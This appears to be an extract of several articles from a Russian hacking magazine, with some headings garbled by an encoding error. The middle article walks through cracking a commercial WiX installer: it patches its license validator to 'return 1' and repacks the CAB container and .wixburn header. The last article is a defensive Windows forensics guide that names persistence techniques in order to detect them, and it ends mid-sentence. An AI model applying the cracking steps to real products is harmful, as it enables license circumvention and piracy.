ÑÒÀÂÈÌ ÕÓÊÈ

Наконец, самое сочное — установка хуков. Алгоритм не отличается ровным
сче том ничем. Умельцы давно реализовали в виде милой DLL-биб лиотеки,
мне остается лишь при ложить ссылку на PoC.


ÂÛÂÎÄÛ

Ис поль зование аппаратных точек останова в пен тестерских целях — очень
необычное и смелое решение, которое встре чается ред ко. Самое главное —
грамот но обрабатывать исключения, которые ты сам себе делаешь. Ведь
если что-то забудешь обработать, то твоя программа упадет и придется все
запускать заново.
ВЗЛОМ





      ИССЛЕДУЕМ ИНСТАЛЛЯТОР
       WINDOWS INSTALLER XML
              TOOLSET




Инсталляторы бывают раз ные: и попроще,
и пос ложнее. Иног да сре ди них попада ются
уж сов сем наворо ченные — их исследова-
ние  прев ращается  в  настоящее  прик-
лючение. Сегодня мы рассмотрим имен но           МВК
такой  слу чай:  раз берем ся,  как  устро ен
изнутри инсталлятор WiX.


В сво их статьях я неоднократно затрагивал инсталляторы и среды для их раз-
работ ки. Эта тема обширна и неисчерпа ема, пос коль ку для удобства и прос-
тоты над базовыми сис темами инсталляции были созданы надстрой ки,
над которыми разработчики соорудили дру гие надстройки, и так далее.
В ито ге сам инсталлятор по сложности и красоте интерфейса (к сожалению,
и размеру) иногда не уступает инсталлируемому пакету, а разборка и реверс
его вызывает профессиональный интерес и дос тавляет нас тоящее удоволь-
ствие. При мер исследования одного из подоб ных инстал ляторов мы и рас-
смот рим в сегодняшней статье.




                        Статья написа на в исследователь ских целях, име-
                         ет ознакоми тельный характер и предназна чена
                       для  специалистов  по  безопасности.  Автор
                      и редак ция не несут ответствен ности за любой
                        вред, причинен ный с применением изложен ной
                    информа ции.  Использование  или  рас простра-
                      нение ПО без лицензии производителя может
                      прес ледоваться по закону.


Итак, у нас име ется инсталлятор для некоего технического пакета, оформлен-
ный в виде весьма уве сис того (раз мером в нес коль ко гигабайтов) самодос-
таточного EXE-файла. Интерфейс у инсталлятора продвинутый и стильный, он
не похож на визуальное представление ни одного из встречав шихся нам
до этого стандар тных инсталляционных пакетов. Здесь много эле ментов
управле ния, которые шус тро перек люча ют стра нички по мере заполнения,
приближая начало установки программы. Но вот беда — в определенный
момент инсталлятор начина ет требовать лицен зию, без которой упорно
не желает перехо дить на следующий экран.





Мы уже встречались с подоб ным поведением программ установ ки в предыду-
щих статьях. Однако в этот раз выяснилось, что прог рамма содержит все неп-
риятные фичи, присущие инсталляторам:
 1. Из весьма уве систого EXE-файла исполняемым является только крохот-
  ный и совершенно неинформативный заг рузчик.
 2. Владелец про цесса тоже относительно неболь шой EXE-файл, запущенный
   из системной папки временных фай лов.
 3. Перед нами не хорошо изу чен ные msiexec или InstallShield, а что-то иное.

По пытав шись приаттачиться к запущен ному процес су при помощи x64dbg,
мы видим, что код явно скомпилирован в про цессе исполнения. Этот код
до боли напоминает .NET, что косвенно подтверждается наличием в памяти
про цесса  загруженных  дотнетовских  библиотек   (clr.dll,  clrjit.dll,
mscoree.dll и так далее). Одна ко ни сам инстал лятор, ни исполня емый файл
из вре менной пап ки .NET-приложениями не явля ются.
   Дот нетовский отладчик dnSpy хоть и распознает процесс как родной
и даже успешно коннектится к нему, но никакого дотнетовского кода при этом
не показывает и трас сировать приложение не дает. В принципе, дотнетов-
ские про екты с закрытым кодом мы уже учи лись потрошить в статьях «Не-
ядер ный реактор. Взламываем протек тор .NET Reactor» и «Ангард! Реверсим
при ложе ние, защищенное DNGuard», одна ко побережем пока что тяжелую
артилле рию. Попробуем для начала разоб рать ся, с чем именно мы стол кну-
лись на этот раз. Необходимую зацеп ку нам дает Detect It Easy.





Очевидно, и сам инсталлятор, и времен ный файл распознаются DIE как WiX
Toolset installer с оверлеем Microsoft Cabinet File (CAB). Про CAB, в принципе,
можно было бы догадаться по сигнатуре 4D534346 (MSCF) у овер леев, но это
нам еще при годится чуть позже.
  А пока попробуем вспомнить, что такое WiX и чем именно это знание
может помочь в дальнейшем анализе приложения. Это слово из трех букв
рас шифровывается как Windows Installer XML Toolset и пред ставляет собой
(как сле дует из названия) набор инстру ментов для создания инстал ляци-
онных пакетов на осно ве XML-опи сания. Если тебе интересно узнать попод-
робнее про этот пакет, ты можешь озна комить ся с его особенностями, нап-
ример, в статье на «Хабрахабре».
   Хоть автор и плачется по поводу пло хой документированности пакета,
информация о нем в открытом доступе есть, и мно го. Воз можно, я ког-
да-нибудь и сам напишу статью об особен ностях внутреннего формата этого
типа инсталляторов, но тема нашей сегодняшней статьи лежит в иной плос-
кости.
   Cуть в том, что основное достоинс тво технологии WiX в ее расширяемос-
ти — несмотря на наличие своих собствен ных интерфейсных шаблонов, в ней
име ется  возможность подклю чить  кас томный интерфейс  пользовате ля,
написанный на .NET (Custom Bootstrapper Application). Что мы и наблюдаем
в нашем приложе нии. Как самому создавать подобные интерфей сы, мож но
узнать в статье Writing Your Own .Net-based Installer with WiX.
  Перед нами же сто ит прямо противо положная задача — разоб рать ся
с существующим при ложением. Для этого его нуж но хотя бы разобрать
на сос тавные фай лы, и, к счастью, WiX предоставляет для этого необ ходимый
инструментарий. Для начала заходим на GitHub и качаем оттуда архив
wix311-binaries.zip. Он  содер жит  набор  ути лит  командной  стро ки
для работы с WiX-инсталляторами, из которого для нас представляет интерес
dark.exe — экстрак тор файлов из WiX-архива. Пользоваться им не просто,
а очень прос то: надо всего-навсего запус тить его из командной строки:


dark.exe <имя нашего инсталлятора.exe> -x
 <имя каталога, в который будут распаковываться файлы пакета>

Пос ле отработ ки команды в ука занном нами каталоге будет создана сложная
система под катало гов с инсталлируемы ми MSI-пакетами, ресурсами и биб-
лиотеками,  необходимы ми  для  уста новки.  К  великому  сожале нию,
это работа ет толь ко в одну сторону. Фарш невоз можно провернуть назад,
и собрать обратно из этой солянки инстал ляционный EXE будет совсем
не прос то, но мы подума ем об этом позже. А сейчас нас интересуют ресур сы
WiX, которые находятся в под папке UX в кор не распакованного каталога.
В частности, особый интерес пред ставляет файл BootstrapperCore.config,
в секции wix.bootstrapper которого  (как мы узнали из про читанной
документации) и содержится имя Custom Bootstrapper Application:


<?xml version="1.0" encoding="utf-8" ?>
<configuration>
  <configSections>
    <sectionGroup name="wix.bootstrapper" type="Microsoft.Tools.
WindowsInstallerXml.Bootstrapper.BootstrapperSectionGroup,
BootstrapperCore">
      <section name="host" type="Microsoft.Tools.WindowsInstallerXml.
Bootstrapper.HostSection, BootstrapperCore" />
    </sectionGroup>
  </configSections>
  <startup useLegacyV2RuntimeActivationPolicy="true">
    <supportedRuntime version="v4.0" />
  </startup>
  <wix.bootstrapper>
    <host assemblyName="Xeam.VisualInstaller">
      <supportedFramework version="v4\Full" />
      <supportedFramework version="v4\Client" />
    </host>
  </wix.bootstrapper>
</configuration>

По хоже, мы вышли на следующий уро вень, ибо Xeam Visual Installer — это еще
одна надстройка над WiX. А имен но сис тема создания визуальных инстал-
ляторов для тех, кому не нравятся «скуч ные обои» встро енных в WiX шаб лонов
инстал ляци онных интерфей сов. Покурив  тут же нагугленное руководство
по данному пакету, обнаружи ваем, что разбираемый нами инстал лятор —
пол ностью шаб лонное приложение Xeam  Visual  Installer, заточенное вот
под такой шаб лон.





Создатели Xeam Visual Installer избавили своих поль зователей от рисования
и программи рования интерфейса. Им нуж но всего-нав сего написать мел кие
про цедуры валидации вво димых параметров и переходов меж ду экра нами.
Заг рузив в dnSpy библиотеку Bootstrapper.Ui.dll из каталога UX и немного
изучив код класса Xeam.VisualInstaller.MainWindow, находим вот такой
валидатор лицен зии.





Несмотря на кажущуюся слож ность, мы уже научились закорачивать подоб-
ные методы прос тым двухбай товым патчем return 1 по смещению файла
0x2750.





Проверить действен ность выб ранно го метода достаточно просто. При атта-
чив шись с помощью x64dbg к инстал лятору и найдя поиском по шаблону
иско мый IL-код, пат чим нуж ные два байта в памяти и убеждаем ся, что после
окна про вер ки лицензии переход к сле дующе му окну выполняется без проб-
лем. На этом месте мож но было бы и остановиться, установив пакет столь
экзотическим способом. Мож но также написать лоадер, на лету патчащий
про цесс инсталлятора, но мы пойдем самым слож ным путем: будем патчить
инстал ляци онный пакет.
   Как я уже писал, после того как мы разобрали WiX-пакет на сос тавля ющие
при помощи dark.exe, нельзя так прос то взять и собрать пропатченный
пакет обратно. Поправить пару бай тов в самом пакете тоже нельзя, там ком-
прессия. Поэтому при дется покопать ся во внутренней структуре пакета,
которая, к сожалению, не документирована вооб ще.
  Однако в мире достаточно любопытных энтузиастов, которые озадачи-
вались этой проблемой до нас. В принципе, нес ложно было бы и самим
разоб рать ся во всем, минут пятнадцать погоняв код загрузчика в отладчике,
но не буду  заг ромождать повествование подробнос тями,  как получать
информацию, а перей ду сра зу  к результату. Если открыть инсталлятор
в каком-нибудь редак торе EXE (например, Hiew), то в его заголов ке мы уви-
дим сле дующие секции:


Number  Name     VirtSize   RVA         PhysSize    Offset      Flag
1       .text    00048FF7   00001000    00049000    00000400
60000020
2       .rdata   0001F760   0004A000    0001F800    00049400
40000040
3       .data    000016FC   0006A000    00000A00    00068C00
C0000040
4       .wixburn 00000038   0006C000    00000200    00069600
40000040
5       .rsrc    0007DECC   0006D000    0007E000    00069800
40000040
6       .reloc   00003DD0   000EB000    00003E00    000E7800
42000040

Об рати внимание на сек цию .wixburn, специфи ческую для каж дого WiX-
инстал лятора. Именно по ней, кстати, Detect  It Easy и определяет при над-
лежность приложе ния к этому типу. Перей дя к указан ной секции, мы видим
такую пос ледовательность байтов.





Она интерпре тируется следующим образом:


0     DD        Magic number                            0xF14300
4     DD        Version                                 2
8     DB 16 DUP ( ?) Bundled GUID                        {3F10D12E-
D4C3-4DE6-EDBD-079DBB81B6A9}
0x18  DD        Engine ( stub) size                      0xEB600
0x1C  DD        Original checksum                       0x1F45150
0x20  DD        Original signature offset               0x1F383A8
0x24  DD        Original signature size                 0x2D78
0x28  DD        Container Type ( 1 = CAB)                1
0x2C  DD        Container Count                         2
0x30  DD        Byte count of manifest + UX container   0x1E4CDA2
0x34  DD        Byte count of attached container        0x4363C6C9

Попробуем разобраться, что представляют собой эти поля. Engine (stub)
size — это размер исполняемого модуля, после него по сме щению 0xEB600
от начала файла начинается оверлей. Он представ ляет собой содержимое
катало га UX, то есть ресурсы инсталлятора WiX и Xeam Visual Installer, которые
и содержат пропатченный нами файл Bootstrapper.Ui.dll.
   Как я уже упо минал, этот оверлей имеет сигнатуру 4D534346 (MSCF), то
есть упакован в CAB-архив, что и подтвержда ет строка Container Type=1.
Сра зу   за   UX   container   по  сме щению   Original   signature
offset=0x1F383A8 от начала файла начинается подпись файла. Пос ле нее
по сме щению 0x1F383A8+0x2D78=0x1F3B120 от начала файла расположен
самый боль шой attached container, содержащий в себе все файлы инстал-
лируемого пакета. Этот архив тоже имеет сиг натуру MSCF и тип CAB.
  Мо раль всех этих изысканий такова: если мы хотим, чтобы инстал лятор
корректно работал после перепаков ки и замены CAB-контей нера, мы должны
поправить как минимум смещения в заголов ке секции .wixburn.
  Попробуем про делать эту операцию на практике.
  Для начала откро ем наш файл в редакторе WinHex и разобьем его на три
части: 0-0xEB600 — исполняемый образ, 0xEB600-0x0x1F383A8 — UX
container и хвост от 0x1F383A8 до конца файла — сигнатура + attached
container.
   Те перь нам надо заменить в UX container файл Bootstrapper.Ui.dll
исправ ленным. Эта операция на самом деле не такая уж и простая. Рас-
паковывать CAB-файлы уме ют практичес ки все архивато ры, однако внут-
реннее содержимое у них неструктуриро ванное, фай лы обез личены, причем
они час то имеют номерные названия. Вдо бавок мало кто из известных архи-
вато ров уме ет собирать CAB-архивы. 7-Zip и WinRAR, к примеру, не уме ют,
а вот экзотический PowerArchiver умеет, им и воспользуемся.
  Выкрутиться с именами файлов тоже довольно прос то: поскольку раз меры
файлов уни кальные, дос таточно упорядочить эти самые файлы по величи не
и пос мотреть,  какой файл  в  архиве  соответс твует раз мером нашему
Bootstrapper.Ui.dll. В нашем случае это u5 — пере име новываем исправ-
ленный Bootstrapper.Ui.dll в u5, закиды ваем его вместо прежнего и снова
собираем CAB при помощи PowerArchiver. Раз мер при перепаковке, естес-
твен но, изменился, поэтому пос ле того, как мы сно ва скле или три части, поп-
равим заголо вок сек ции .wixburn. Как показы вает практика, достаточно
поменять Original signature offset для того, чтобы инстал лятор коррек-
тно отработал.
  В заключение хочу выразить надеж ду, что полученная в этой статье
информация будет исполь зоваться не в дес труктивных и криминальных целях,
а исключительно на бла го общес тва, например для локализации и совер-
шенс твования пакетов без полного пересоз дания дис трибутива. А кому-то,
воз можно, это откроет путь для соз дания инсталлятора собственной прог-
раммы с оригинальным и прод винутым интерфей сом.
ВЗЛОМ





   БОЛЬШОЙБОЛЬШОЙ ГИДГИД
   ПОПО АРТЕФАКТАМАРТЕФАКТАМ
     WINDOWSWINDOWS




Сегодня мы погово рим об основных арте-
фак тах Windows, которые помогают иссле-
дователю обнаружить вектор компро мета-
ции,  признаки  боково го  переме щения
по сети и закрепления в сис теме, а так же             rayhunt454                                                                                       grigadan454@gmail.com
разберем тонкости работы с инструмен-
тами для ана лиза этих артефактов.


Итак, представим, что мы получили от кли ента жесткий диск, содер жащий
следы хакер ской атаки. Известно, что система работала на Windows. Наша
цель — собрать арте фак ты для дальнейшего ана лиза.
  Я буду исполь зовать следующие средства:
 1. R-Studio — ути лита для вос становления данных.
 2. FTK Imager — инструмент для анализа и получения обра зов диска.
 3. Ути литы NirSoft для Windows.
 4. Ути литы Eric Zimmerman для ана лиза артефак тов Windows.


ÏÎËÓ×ÀÅÌ ÏÎÁÈÒÎÂÓÞ ÊÎÏÈÞ ÄÈÑÊÀ

По лучить дамп диска просто: заг ружаемся с Live-образа Kali Linux в режиме
Forensics и исполь зуем утилиту dd. Либо мож но вытащить диск из системника,
под клю чить к ап паратному блокиратору и снять образ с помощью инструмен-
тов R-Studio, FTK Imager, Encase или им подоб ных. Иногда дос таточ но
на живой системе запустить пор табель ные ути литы и получить образ дис ка
либо использовать сборщики Kape или FastIR Collector, которые соберут
артефакты в авто матическом режиме.
  В R-Studio получе ние обра за будет выг лядеть так. Запускаем утилиту,
выбираем диск и перехо дим на вкладку «Создать образ».





                     Соз дание образа дис ка

Сжатый образ сканирует только занятые участки памяти и копиру ет их, а если
выбрать несжатый образ — получится полная копия диска. При восстанов-
лении удаленных файлов лучше использовать нес жатый образ.


ÌÎÍÒÈÐÓÅÌ ÎÁÐÀÇ

Первым делом монтиру ем образ диска. Для это го хороша утилита Mount
Image Pro, либо можешь глянуть FTK Imager.





                    Монтирование в FTK

Нажима ем на значок Image Mounting, ука зываем путь к файлу образа, в Mount
Method выбираем монтирова ние на запись.





                   Монтирование обра за

Далее нажимаем Mount, и диск появится в файловой сис теме.
   Те перь можно исследовать файлы в ручном режиме. Луч ше всего вос-
поль зоваться  ути литой  R-Studio,  которая  поз воля ет  ска ниро вать  диск
на пред мет удаленных фай лов, а так же сортировать все файлы по датам соз-
дания либо по расширению.





                    Содержимое R-Studio


ÑÊÀÍÈÐÓÅÌ ÔÀÉËÎÂÓÞ ÑÈÑÒÅÌÓ

Прежде чем анализи ровать артефакты, полез но проверить, нет ли в фай-
ловой системе подозритель ных файлов. Сканировать можно утилитой Loki
Scanner, которая уме ет определять многие индикаторы ком прометации. Она
ищет по име нам фай лов, хеш-суммам, а в слу чае надоб ности в ход идут
и правила Yara.
   .\loki.exe -p D:\ -l log





                       Баннер Loki Scanner

Еще можно вос пользовать ся портабельными анти вирус ными утилита ми. Нап-
ример:
 • KVRT — средство Kaspersky для поис ка вредонос ных фай лов;
 • CureIt — аналог, соз данный в Dr.Web;
 • Spyre — сканер индикато ров ком про метации по правилам Yara.

Этот этап помога ет исследователю обна ружить подозрительные файлы,
от которых можно оттолкнуть ся при расследова нии инцидента и искать пути
про никновения в систему.


ÏÎËÓ×ÀÅÌ ÎÑÍÎÂÍÓÞ ÈÍÔÎÐÌÀÖÈÞ Î ÑÈÑÒÅÌÅ

Пе ред началом иссле дования нужно соб рать пер вичную информацию о сис-
теме. Для это го вос становим ветки реестра SOFTWARE и SYSTEM, чтобы
получить из них сле дующие ключи:
 • SYSTEM:    ControlSet001\Control\TimeZoneInformation  —
  информация об уста новленной времен ной зоне;
 • SYSTEM: ControlSet001\Control\ComputerName\ComputerName —
  име на компьюте ра;
 • SYSTEM:          ControlSet001\Services\Tcpip\Parameters\
  Interfaces — информа ция об идентификаторах сетевых интерфей сов,
   в которых указываются сетевые настройки, а в ключе ControlSet001\
  Services\Tcpip\Parameters мож но обна ружить имя домена;
 • SOFTWARE: Microsoft\Windows NT\CurrentVersion — информация
  об опе раци онной системе: версия, сборка и дру гое;
 • SOFTWARE:  Microsoft\Windows\CurrentVersion\Uninstall —
   список установленных программ;
 • SAM: SAM\Domains\Account\Users — информа ция о локальных поль-
   зователях системы.

Что бы авто мати зиро вать процесс, доб рые люди уже написа ли полез ный
скрип тик на Python — python-registry. В каталоге samples ты найдешь скрипт
system_info.py, который анализи рует перечисленные ключи. Нужно будет
только нем ного его подредак тировать: добавить код, который перед каждым
доступом к клю чу будет счи тывать выг ружен ные тобой ветки.


ÈÙÅÌ ÇÀÊÐÅÏËÅÍÈÅ Â ÑÈÑÒÅÌÅ

Ес ли при сканировании фай ловой системы не удалось обнаружить вре донос-
ный файл, то имеет смысл начинать исследование с поис ка мест зак репления
вре доно са в системе.
  Для это го предназначена ути лита Autoruns. Запускай, откры вай вкладку
File → Analyze Oﬄine System и выбирай путь к сис темному диску (который мы
при монтировали раньше). Также нужно задать путь до конкрет ного поль-
зователя.
   Ути лита показы вает множество основных путей зак репления, но при ана-
лизе при мон тирован ного обра за лег ко пропустить многие моменты. Давай
пройдемся по основным путям зак репления вредоно са в системе и инстру-
ментам, которые помогут собрать дополнительные све дения.
  Системные кусты реестра хранятся в каталоге C:\Windows\System32\
config, пользовательские NTUSER.DAT — в каталоге C:\Users\<User>\
AppData.


WMI Persistence (Ò1546.003)
WMI (Windows Management Instrumentation) — набор инс трументов, пред-
назна ченных для управления системами Windows. WMI популярен сре ди зло-
умыш ленни ков, поскольку позволяет выполнять раз ведку в сети, обнаружи-
вать анти вирусы и виртуальные машины, выполнять произвольный код, сох-
ранять свое при сутствие в системе, а также переме щаться по корпоративной
сети.
  В опре делениях WMI действия называются потребителями (Consumers),
а события — фильтрами  (Filters). Существует  также третий компонент,
который связывает их вместе, — привязка (Binding). Злоумышленник создает
три класса:
 • __EventFilter — некий фильтр дей ствий в системе, к примеру вход
   пользователя или соз дание про цесса;
 • __EventConsumer — действие, которое выполняет злоумышленник,
   к примеру запуск полезной нагрузки;
 • __FilterToConsumerBinding — объект, который свя зывает эти два
   клас са.

Что бы закрепиться этим методом, зло умышленники используют утилиту,
которая уме ет взаимодействовать с WMI (wmic.exe). Чтобы понять, происхо-
дило ли что-то такое, нам нуж но проана лизировать следующий файл:


C:\Windows\System32\wbem\Repository\OBJECTS.DATA

Наша цель — найти классы __FilterToConsumerBinding, а затем по име ни
__EventConsumer найти все действия. Сделать это можно в любом двоичном
редак торе. Вби вай в поиске класс свя зыва ния филь тра и действия —
__FilterToConsumerBinding. Есть и готовый инс трумент, который сде лает
всю работу за тебя, он называется PyWMIPersistenceFinder.py. Я уже показы-
вал, как с его помощью обнаружи вать закрепление, когда разбирал лабора-
торию CyberCorpCase 1.


Êëþ÷è çàïóñêà â ðååñòðå è ïàïêà àâòîçàãðóçêè (T1547.001)
Что бы задетектить эту технику закрепления, нам с тобой нужно проанализи-
ровать кусты реестра SOFTWARE и NTUSER.DAT.
  В кус те SOFTWARE смотрим следующие ключи, отвечающие за при сутс твие
в ОС от имени системы или адми на:
 • Microsoft\Windows\CurrentVersion\Run;
 • Microsoft\Windows\CurrentVersion\RunOnce;
 • Microsoft\Windows\CurrentVersion\RunServices;
 • Microsoft\Windows\CurrentVersion\RunServicesOnce;
 • Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit;
 • Microsoft\Windows NT\CurrentVersion\Winlogon\Shell;
 • Microsoft\Windows\CurrentVersion\Explorer\Shell Folders.

Не забываем глянуть те же клю чи в кусте реес тра NTUSER.DAT:\SOFTWARE —
чтобы понять, не было ли зак репления с правами пользователя.
  Копаться в реестре я рекомендую с помощью RegistryExplorer. Обрати
вни мание на путь к исполняемому фай лу и на вре менные метки ключа реес-
тра.
  А вот сюда сто ит заглянуть в поисках вредонос ных исполня емых фай лов:


C:\Users\<User>\AppData\Roaming\Microsoft\Windows\Start Menu\
Programs\Startup

Вредоносы, лежащие в такой папке, будут стартовать автоматически и при-
нимать ся пакостить сразу после загрузки. Также обращай внимание на фай-
лы .lnk, в них иногда прячутся команды PowerShell или CMD.


Ñöåíàðèé âõîäà â ñèñòåìó Windows (T1037.001)
За автоматичес кое выполнение скриптов при входе в систему отвечает куст
реестра NTUSER.DAT, точнее, ключ Environment\UserInitMprLogonScript,
где перечисляются исполняемые фай лы. К примеру, APT-группа XDSpy
записы вала сюда адрес вредоносного фай ла, сохраненного в AppData\
Local\Temp.




            Зак репле ние вредонос ного исполня емого фай ла


Ñëóæáû Windows (T1574.011)
Зло умыш ленни ки могут использовать неп равиль ные разрешения на ключи
реестра той или иной службы, чтобы выпол нять полезные нагрузки.
   Чтобы зак репиться этим методом, исполь зуется сис темная утилита sc.
exe. Для поис ка зак репившихся вредоносов смотрим куст SYSTEM, ключ
ControlSet001\Services и обращаем внимание на ImagePath.  Также
не забываем про закрепления Service DLL, когда сервисная динамичес кая
библиотека запускает ся в контексте процесса svchost.exe. Для парсинга
ключа Services можно вос поль зоваться библиотекой python-registry либо
тем же RegistryExplorer.
   Вот как это реали зовать на Python:


from typing import List
from Registry import Registry
import argparse
from datetime import datetime
import csv



def ReadRegistryFile(reg):
    f = open(reg,'rb')
    registry = Registry.Registry(f)
    f.close()
    return registry


class Service:
    Name: str = ''
    ImagePath: str = ''
    Description: str = ''
    DisplayName: str = ''
    ServiceDll: str = ''
    Timestamp: datetime = datetime.now()
    Type: int = 0


def control_set_check(sys_reg):
    registry = ReadRegistryFile(sys_reg)
    key = registry.open("Select")
    for v in key.values():
        if v.name() == "Current":
            return v.value()


def GetServices(sys_reg: str) -> List[Service]:
    registry = ReadRegistryFile(sys_reg)
    key = registry.open("ControlSet00%s\\Services" %
control_set_check(sys_reg))
    result: List[Service] = []
    for s in key.subkeys():
        service = Service()
        service.Name = s.name()
        for v in s.values():
            service.Timestamp = s.timestamp()
            if v.name() == "ImagePath":
                service.ImagePath = v.value()
            if v.name() == "Description":
                service.Description = v.value()
            if v.name() == "DisplayName":
                service.DisplayName = v.value()
        fk = s.subkeys()
        for i in fk:
            if i.name() == "Parameters":
                for j in i.values():
                    if j.name() == "ServiceDll":


                        service.ServiceDll = j.value()


        result.append(service)
    return result


if __name__=="__main__":
    parser = argparse.ArgumentParser(
            prog='ProgramName',
            description='What the program does',
            epilog='Text at the bottom of help')
    parser.add_argument('--system',help="Path for SYSTEM registry
hive")
    args = parser.parse_args()
    with open('sw_data_new.csv', 'w+') as f:
            writer = csv.writer(f)
            writer.writerow(['Имя', 'Описание','Имя на дисплее',
'Путь к файлу','Сервисная DLL', 'Дата создания'])
            for i in GetServices(args.system):
                writer.writerow([i.Name,i.Description,i.DisplayName,i
.ImagePath, i.ServiceDll,i.Timestamp])



Ïëàíèðîâùèê çàäà÷ (T1053.005)
Что бы най ти тай но нап ланированные злодеями задачи, дос таточно заглянуть
в C:\Windows\System32\Tasks и пос мотреть сох раненные там XML-файлы.
При анализе обращай вни мание на авто ра задачи в поле Principal → UserId
и на команды в полях Exec → Command и Exec → Arguments, а также на триг-
гер запуска вре доноса в поле Settings.


Çàäàíèÿ BITS (T1197)
Зло умыш ленни ки используют BITS для заг рузки вредонос ных файлов, так
как эти фай лы стартуют в кон тексте легитим ной службы. Чтобы создать
задание BITS, можно исполь зовать фун кции API или системную ути литу
bitsadmin.
   Здесь хранится база заданий BITS:


C:\ProgramData\Microsoft\Network\Downloader

Формат базы дан ных — QMGR. Начиная с Windows 10, она использует фор-
мат Extensible Storage Engine (ESE) и хра нится в файле qmgr.db. В более ран-
них версиях Windows ищи фай лы qmgr0.dat и qmgr1.dat (информация в них
по большей части дублируется).
   Чтобы прочитать эти файлы, тебе понадо бится ути лита BitsParser. Самое
важ ное для нас — кто создал задачу и какая коман да выполнялась.


python3 BitsParser.py -i qmgr0.db


ÑÎÁÈÐÀÅÌ ÈÍÔÎÐÌÀÖÈÞ ÎÁ ÈÑÏÎËÍßÅÌÛÕ ÏÐÎÃÐÀÌÌÀÕ

Для анализа запущен ных приложений в Windows сущес твует мно жес тво инс-
трументов.


Prefetch
Файлы трассировки лежат в C:\Windows\Prefetch. Из них можно почерпнуть
имя выпол няемого файла, количес тво запусков, спис ки фай лов, с которы ми
взаимо действовал исполняемый файл, а также вре менные мет ки: время
и дату первого запуска, время изменения и вре мя последних семи запус ков.
   Ути литы для анализа:
 • WinPrefetchView;
 • PECmd.

В серверных версиях Windows запись дан ных по умолчанию отключена.
  Запускай  WinPrefetchView, перехо ди на вклад ку Options → Advanced
Options и указывай путь к фай лам Prefetch.





                Ар тефакт запуска вредоно са DeedRAT

На иллюс трации мы видим, что запускалась еще и динамическая библиотека
AFXML.DLL. Всег да обращай внимание на используемые фай лы. Подробнос-
ти мож но узнать в интерес ной статье о поиске тактик и техник в фай лах
Prefetch.


Amcache
Amcache — куст реестра Windows, который хранит информа цию о запущен-
ных приложе ниях, путь, временную мет ку пер вого запуска и SHA-1-хеш фай-
ла. Этот файл ты найдешь здесь:


C:\Windows\appcompat\Programs\Amcache.hve

В Windows 8 эти артефакты хранятся в файле RecentFileCache.bcf. Струк-
тура  это го  куста  реестра  описана  в  статье  Leveraging  the  Windows
Amcache.hve File in Forensic Investigations.
   Также в каталоге C:\Windows\appcompat\Programs\Install хранит ся
информация о каждой уста новленной программе.
   Ути литы для анализа:
 • AmcacheParser извлекает дан ные, содержащиеся в Amcache.hve;
 • RecentFileCacheParser.exe    извлекает   данные    из   файла
  RecentFileCache.bcf;
 • python-registry-amcache.

При запуске AmcacheParser.exe используй следующую команду:


.\AmcacheParser.exe -f "Amcache.hve" --csv "путь выгрузки"

Ре зультат  смот рим  в  файле  Amcache_UnassociatedFileEntries.csv.
Хеш-сум му SHA-1 можешь сразу пробить на VirusTotal.


Shimcache
Shimcache — это механизм, который обес печива ет обратную совместимость
ста рых при ложений с более новыми вер сиями Windows. Его параметры хра-
нят ся в кус те реестра SYSTEM:


C:\Windows\System32\config

Клю чи:
 • CurrentControlSet\Control\Session;
 • Manager\AppCompatCache\AppCompatCache.

В кеше мож но найти путь к файлу, размер фай ла, время последне го изме-
нения, вре мя пос леднего обновления Shimcache, флаг выпол нения процес-
са. В зависимости от версии Windows этот список может слегка различаться.
   Анализи ровать кеш удоб но ути литой AppCompatCacheParser.exe:


.\AppCompatCacheParser.exe -f "SYSTEM" --csv ".\report"


UserAssist
В файле куста реестра пользовате ля NTUSER.DAT есть ключ UserAssist,
помогающий отсле живать выполняемые программы. Здесь можно найти дан-
ные о при ложе ниях, запущенных определен ным пользовате лем через про-
вод ник Windows. Исполняемые файлы, запущен ные из командной строки,
не отображаются. Информация записана в двоичном виде.
  Ключи реестра UserAssist хра нятся вот в этой вет ке:


Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist\{GUID}\
Count\

GUID для Windows 7 и выше:
 • {CEBFF5CD-ACE2-4F4F-9178-9926F41749EA} — запуск исполняемого
  фай ла;
 • {F4E57C4B-2036-45F0-A9AB-443BCFE33D9F} — запуск исполняемого
  фай ла с помощью символической ссылки.

Каж дое значение UserAssist закоди ровано в формате ROT13. Среди данных
есть информация о числе запус ков исполня емого файла или ссылки, а также
метка времени пос леднего выполнения.
  Для парсинга это го клю ча реестра можно воспользоваться утилитой
4Discovery.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ




                            БОЛЬШОЙ ГИД
                    ПО АРТЕФАКТАМ WINDOWS





ÈÇÂËÅÊÀÅÌ ÂÐÅÌÅÍÍÛÅ ÌÅÒÊÈ È ÄÅËÀÅÌ ÒÀÉÌËÀÉÍ
ÑÎÁÛÒÈÉ

Таб лица MFT фай ловой системы насчитывает более восьми вре мен ных
меток. Они хранятся в атри бутах STANDART_INFO и FILE_INFO. Но пом ни, что
злоумышленники могут изменять мет ку STANDART_INFO у вре донос ных фай-
лов. Сама таблица MFT хранит ся в корне сис темного диска и называется
$MFT. Что бы выгрузить таб лицу из образа, можешь исполь зовать R-Studio
или FTK Imager.
  Для анализа обра за пригодят ся ути литы MFTECmd или MFTExplorer.


.\MFTECmd.exe -f "MFT" --csv ".\report"

По лученный файл .csv мож но просмотреть в Excel, отфильтровав данные
по  дате  соз дания,  либо  можешь  изу чать  их  с  помощью  ути литы
TimeLineExplorer.
  Для пос троения времен ной шкалы событий существует ути лита Plaso.
Исходные данные для нее лучше всего готовить с использовани ем скрипта
psteal.py, которому можно скормить побитовый образ, либо указать путь
к смонтированному диску. Psteal сохраняет данные в файл .csv, для его ана-
лиза мож но воспользоваться шаблоном TIMELINE_COLOR_TEMPLATES.csv.




                     Под робнее о  Plaso и пос тро ении таймлайнов
                        читай в стать ях  «Таймлайн всего. Используем
                         Plaso для сбора системных событий», «Цифровой
                        детектив.  Используем  Timesketch  для  работы
                        с таймлайнами Plaso» и «Прыжок в Sigma-ляр-
                          ность. Используем пра вила Sigma в Timesketch».


Еще можешь посмотреть утилиты Autopsy и AXIOM, которые тоже отлично
справляют ся с выстраива нием тай млайна.
  В Windows 10 с версии 1803 появился полезный файл под наз вани ем
ActivityCache.db. Это база данных в фор мате SQLite, где содержится
готовая временная шкала  активности  устройства. Здесь  есть  отметки
обо всех откры вав шихся файлах, использован ных при ложе ниях и службах.
Нуж ный файл ты найдешь вот в этом катало ге:


